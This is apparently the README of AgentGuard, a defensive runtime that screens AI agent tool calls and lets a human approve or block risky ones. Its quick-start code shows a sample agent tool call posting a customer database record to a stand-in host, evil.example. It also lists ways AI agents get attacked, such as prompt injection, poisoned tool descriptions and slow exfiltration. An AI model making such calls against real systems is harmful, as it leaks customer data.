# Aegotrax

**Runtime protection for AI agents — checks tool calls before they run.**

Public site: [https://aegotrax.com](https://aegotrax.com)  
Repository: [https://github.com/aegotrax-dev/aegotrax](https://github.com/aegotrax-dev/aegotrax)

This repo is the open **pilot runtime**. The installable Python package name is `agentguard`.

---

# 🛡️ AgentGuard v0.2.4 — Hardened Pilot Runtime

Intercept tool calls, evaluate **server-side intent + data provenance**, and **block or require human approval** before sensitive actions run.

| Integration | Use when |
|-------------|----------|
| **Python SDK** | You call tools from your own code (`verify_tool_call` / `@protected_tool`) |
| **MCP Gateway** | The agent already speaks MCP and you want one interception point |

### What’s new in 0.2.4
- **Human-approval queue** — `REQUIRE_APPROVAL` returns `approval_id` + `approval_token`; approve via `POST /approval/decide`; single-use resume on `/verify`
- From **0.2.3**: server-side intent only, hostname allowlists, SSRF/IMDS guard, session TTL, rate limit, audit redaction, MCP schema pinning

---

## Install

```bash
git clone https://github.com/aegotrax-dev/aegotrax.git
cd aegotrax

python -m venv .venv
# Windows: .venv\Scripts\activate
source .venv/bin/activate

pip install -U pip
pip install .
# optional LangGraph demo deps:
# pip install ".[demo]"
```

**Docker (engine only):**

```bash
docker compose up --build
# → http://127.0.0.1:8000
```

Commands after `pip install .`:

```bash
agentguard-engine     # Risk Engine → http://127.0.0.1:8000
agentguard-gateway    # MCP Gateway (stdio)
```

Health check:

```bash
curl -s http://127.0.0.1:8000/health
```

Expected: `"version": "0.2.4"`, `"server_intent_only": true`.

---

## Quick start (SDK)

With the default `AGENTGUARD_SERVER_INTENT_ONLY=true`, the engine **ignores**
`user_intent` on each verify call. Register intent once via `/session`
(`set_session_context`); that is the source of truth.

```python
from agentguard import verify_tool_call, set_session_context, protected_tool

# 1) Server-side intent (source of truth)
set_session_context(
    "sess-42",
    user_intent="Summarize the ticket only",
    agent_id="support-agent",
    user_id="user-123",  # optional tenant binding
)

# 2) Before every tool call
result = verify_tool_call(
    session_id="sess-42",
    agent_id="support-agent",
    user_intent="",  # ignored when SERVER_INTENT_ONLY=true
    tool="http_post",
    arguments={"url": "https://evil.example", "data": "customer_db_record"},
)

if result["decision"] == "BLOCK":
    raise PermissionError(result["reasons"])

if result["decision"] == "REQUIRE_APPROVAL":
    # Tool was NOT executed.
    # Human: POST /approval/decide {approval_id, token, decision: "approve"}
    # Then resume once with the same tool + arguments:
    result = verify_tool_call(
        session_id="sess-42",
        agent_id="support-agent",
        tool="http_post",
        arguments={"url": "https://evil.example", "data": "customer_db_record"},
        approval_id=result["approval_id"],
        approval_token=result["approval_token"],
    )

# 3) Or decorate real functions
@protected_tool(
    session_id_fn=lambda: "sess-42",
    agent_id_fn=lambda: "support-agent",
    user_intent_fn=lambda: "",
)
def send_email(to: str, body: str):
    ...
```

More detail for pilot hosts: **[PILOT.md](./PILOT.md)**.

---

## Configuration (environment)

| Variable | Default | Purpose |
|----------|---------|---------|
| `AGENTGUARD_API_KEY` | — | If set, required as `X-API-Key` on engine APIs |
| `AGENTGUARD_REQUIRE_API_KEY` | `false` | If `true`, refuse requests when no key is configured |
| `AGENTGUARD_SERVER_INTENT_ONLY` | `true` | Ignore client `user_intent` on `/verify`; use `/session` only |
| `AGENTGUARD_SESSION_TTL` | `3600` | Session idle TTL in seconds (`0` = never expire) |
| `AGENTGUARD_RATE_LIMIT` | `120` | Max `/verify` calls per session per window |
| `AGENTGUARD_RATE_WINDOW` | `60` | Rate-limit window (seconds) |
| `AGENTGUARD_AUDIT_REDACT` | `true` | Redact sensitive keys in audit log arguments |
| `AGENTGUARD_APPROVAL_WEBHOOK` | — | POST when `REQUIRE_APPROVAL` (payload includes token) |
| `AGENTGUARD_APPROVAL_TTL` | `1800` | Pending approval lifetime (seconds) |
| `AGENTGUARD_AUDIT_WEBHOOK` | — | Stream every audit event (best-effort) |
| `AGENTGUARD_POLICY_PATH` | package policy | Custom `policy.yaml` |
| `AGENTGUARD_AUDIT_LOG` | `agentguard_audit.log` | Audit file path (do not commit this file) |
| `AGENTGUARD_MODE` | `simulate` | Gateway: `simulate` / `echo` / `forward` |
| `AGENTGUARD_FAIL_CLOSED` | `true` | Block when engine unreachable |
| `AGENTGUARD_HOST` / `PORT` | `127.0.0.1` / `8000` | Engine bind |
| `AGENTGUARD_ENGINE_URL` | `http://127.0.0.1:8000/verify-multi-agent` | SDK/gateway → engine |
| `AGENTGUARD_ENGINE_TIMEOUT` | `2.0` | Timeout (seconds) to engine |

Policy override order: `AGENTGUARD_POLICY_PATH` → `./policy.yaml` → package default.

**Shared hosts:** set a strong `AGENTGUARD_API_KEY` and `AGENTGUARD_REQUIRE_API_KEY=1`.  
Never bind to `0.0.0.0` without both.

---

## Engine API

| Method | Path | Description |
|--------|------|-------------|
| GET | `/health` | Liveness + hardening flags |
| POST | `/verify-multi-agent` | Main decision API |
| POST | `/session` | Set session intent (+ optional `user_id`) |
| POST | `/session/reset` | Clear session provenance |
| GET | `/session/{id}` | Inspect session |
| POST | `/policy/reload` | Reload policy (audited) without restart |
| POST | `/approval/decide` | Approve or deny (`token` required) |
| GET | `/approval/{id}` | Approval status (token not exposed) |
| GET | `/approvals/pending` | List pending (optional `?session_id=`) |

---

## Human approval queue (`REQUIRE_APPROVAL`)

When a call scores in the approval band (below block, at/above approval threshold):

1. Engine returns `decision=REQUIRE_APPROVAL` plus **`approval_id`** and **`approval_token`**
2. Operator (or webhook consumer):
   ```http
   POST /approval/decide
   { "approval_id": "...", "token": "...", "decision": "approve" | "deny" }
   ```
3. Client re-issues the **same** tool + arguments with `approval_id` + `approval_token`
4. Token is **single-use** (consumed on ALLOW). Mismatch / reuse → BLOCK

```bash
# engine must be running
python examples/approval_flow_demo.py
```

The queue is **in-memory** (cleared on process restart) — appropriate for pilot, not multi-instance HA.

---

## Threats covered

- Indirect prompt injection leading to tool abuse
- Data provenance / multi-hop exfiltration
- Intent constraint violations (“summarize only” → outbound)
- Dangerous script execution
- Poisoned MCP tool descriptions (schema pinning + drift detection)
- Client spoofing of `user_intent` (server-side intent)
- Substring allowlist bypasses on URLs / emails
- SSRF / cloud metadata (IMDS) targets
- Basic session flooding (rate limit)
- Unattended mid-risk actions (human approval queue)

**Not fully covered yet:** slow exfil *inside* a legitimate read scope with no outbound (many small queries). Per-sensitive-tool volume caps are a planned follow-up.

---

## Schema pinning & drift detection (MCP)

A poisoned tool *description* can steer the agent before the tool-call interceptor runs.  
Schemas are pinned at registration; high-severity drift is blocked before the risk engine.

Upstream MCP proxy pattern:

```python
from agentguard.mcp_gateway import pin_upstream_tool, check_upstream_drift

for tool in upstream_tools:
    pin_upstream_tool(tool["name"], tool)

drift = check_upstream_drift(tool["name"], tool)
if drift and drift.severity == "high":
    # do not expose / execute
    ...
```

MCP introspection tool: `schema_status`.

---

## Security hardening (v0.2.4)

| Control | Default | Notes |
|---------|---------|-------|
| Server-side intent only | `AGENTGUARD_SERVER_INTENT_ONLY=true` | `/verify` ignores client `user_intent` |
| API key | optional | Use `REQUIRE_API_KEY=1` on shared hosts |
| Session TTL | 3600s | `AGENTGUARD_SESSION_TTL` |
| Rate limit | 120 / 60s per session | configurable |
| Audit redaction | on | `AGENTGUARD_AUDIT_REDACT` |
| URL allowlist | hostname parse | no substring `in` bypasses |
| SSRF / IMDS guard | on | engine + gateway |
| Email domain | exact / subdomain | rejects `user@company.com.evil.com` |
| Intent patterns | broader | `only`, `just summarize`, `do not send`, … |
| Schema pinning | on | MCP definition drift |
| REQUIRE_APPROVAL | token queue | single-use resume |

Offline checks:

```bash
python examples/security_hardening_test.py
python examples/schema_pinning_demo.py
```

---

## Security notes

This is a **local pilot / sandbox** runtime — not a full enterprise control plane.

1. **Do not expose port 8000 to the internet.** Prefer `127.0.0.1`. Use a strong API key if you must bind wider.
2. **Default gateway mode is `simulate`.** Real HTTP requires `AGENTGUARD_MODE=forward` **and** `AGENTGUARD_ALLOW_REAL_HTTP=1` (lab only). Private/IMDS targets stay blocked.
3. **Policy is heuristic.** Tune `policy.yaml` (`trusted_hosts`, `trusted_domains`, thresholds) for your tools.
4. **Audit logs may contain arguments.** Redaction is on by default; never commit `agentguard_audit.log`.
5. **Webhooks** must not point at loopback/private addresses (SSRF guard).
6. **Approval queue** is in-memory and single-process.

---

## Project layout

```text
aegotrax/
├── agentguard/           # runtime package (engine, gateway, SDK, policy)
├── examples/             # SDK, schema pinning, approval flow demos
├── data/                 # optional policy override for Docker
├── agentguard_demo/      # attack / benchmark helpers
├── PILOT.md              # pilot host guide
├── docker-compose.yml
└── pyproject.toml
```

---

## License

Apache-2.0
